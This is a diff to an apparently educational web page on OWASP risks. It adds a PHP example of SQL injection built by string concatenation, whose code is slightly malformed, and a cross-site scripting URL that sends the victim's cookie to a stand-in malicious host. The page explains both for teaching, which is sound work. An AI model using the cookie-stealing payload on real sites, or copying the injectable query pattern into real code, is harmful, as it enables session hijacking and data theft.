@@ -72,6 +72,17 @@
                     <p>
                         Injection attacks are still the most common type of critical application security risk active today, ranked as the number 1 Most Critical Web Application Security Risk by OWASP. Injection attacks occur when untrusted data is sent to an interpreter as part of a command or query, tricking the interpreter to execute unintended commands or accessing data without the proper authorization.
                     </p>
+                    <textarea class="text-box" cols="160" rows="6">
+                        $db = new mysqli('webtechlec', 'username', 'email', 'password',  'storedb');
+$result = $db->query(
+	'SELECT * FROM transactions WHERE username =[ ' . $_POST['username']
+);
+
+                    </textarea>
+                    <p>
+                    The above code example has several errors tied along with it. For one, the contents of the POST data haven’t been validated, and second, it is allowing an untrusted source to tell the user which username to use, and third, it has not been passed to the query as a bound parameter making it vulnerable for attackers to inject the code with arbitrary strings that would be able to manipulate the SQL query.
+
+                    </p>
                 </div>
             </div>
 
@@ -131,11 +142,17 @@
 
             <div class="content-sub-container">
                 <div class="content-sub-title">
-                    <h3> A7 - Cross-SIte Scripting</h3>
+                    <h3> A7 - Cross-Site Scripting</h3>
                 </div>
                 <div class="content-sub-text">
                     <p>
                         Cross-site scripting may also be considered as a type of injection attack, wherein malicious scripts are sent to trusted websites. When an unsuspecting user encounters this malicious script, the site will be vulnerable to access any cookies, session tokens, or other sensitive information used by the website and retained by the browser.
+                    </p>
+                    <textarea class="text-box" cols="160" rows="4">
+                        http://www.webtechlec~~~/search.asp?q=<script>x=new Image; x.src = "http://super-malicious-site~~~/jihackedsession.php?session-cookie="+document.cookie ;</script>
+                    </textarea>
+                    <p>
+                        The above code is an example of a malicious code using JavaScript. Once the user’s browser has been infiltrated by the attacker, the user will be redirected to the malicious website and have their data stolen.
                     </p>
                 </div>
             </div>
